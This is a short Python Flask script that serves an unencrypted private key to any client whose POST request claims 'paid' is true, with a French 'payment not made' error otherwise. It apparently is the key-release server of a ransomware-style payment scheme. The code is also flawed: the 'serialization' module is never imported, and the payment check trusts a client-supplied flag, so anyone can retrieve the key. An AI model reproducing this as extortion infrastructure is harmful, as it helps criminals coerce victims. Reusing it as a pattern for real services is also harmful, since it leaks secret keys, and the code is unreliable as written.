from flask import Flask, request, jsonify
from keys import load_private_key

app = Flask(__name__)

private_key = load_private_key()

@app.route('/get_private_key', methods=['POST'])
def get_private_key():
    data = request.json
    if data.get('paid') == True:
        private_key_pem = private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption()
        )
        return jsonify({'private_key': private_key_pem.decode('utf-8')})
    else:
        return jsonify({'error': 'Paiement non effectué'}), 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
